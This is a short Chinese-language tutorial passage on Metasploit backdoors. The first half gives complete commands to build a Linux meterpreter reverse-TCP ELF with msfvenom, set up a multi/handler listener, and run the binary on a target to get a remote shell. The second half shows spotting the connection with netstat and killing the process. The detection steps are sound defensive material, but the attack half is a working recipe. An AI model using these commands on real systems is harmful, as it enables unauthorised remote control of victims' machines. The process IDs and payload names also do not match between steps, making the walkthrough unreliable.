## **常规 MSF 后门**

 生成linux可执行文件，反向tcpshell后门。
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=7777 -f elf >shell.elf
```
MSF服务端监听
```
use exploit/multi/handler
set payload linux/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 7777
run
```
目标机运行可执行文件
```
chmod +x shell.elf
./shell.elf
```
成功上线。

## **排查上线的后门**

分析：Linux下查看进程，看到攻击IP
```
netstat -anpt   //以数字格式显示地址和端口号，同时显示与其关联的进程标识符和进程名称。
```
```
tcp 0 0 172.17.26.190:38294 47.94.236.117:7777  ESTABLISHED(正在监听)  22786/./shell.elf
```
杀掉进程id，删除木马文件
```
kill 1178678 
```

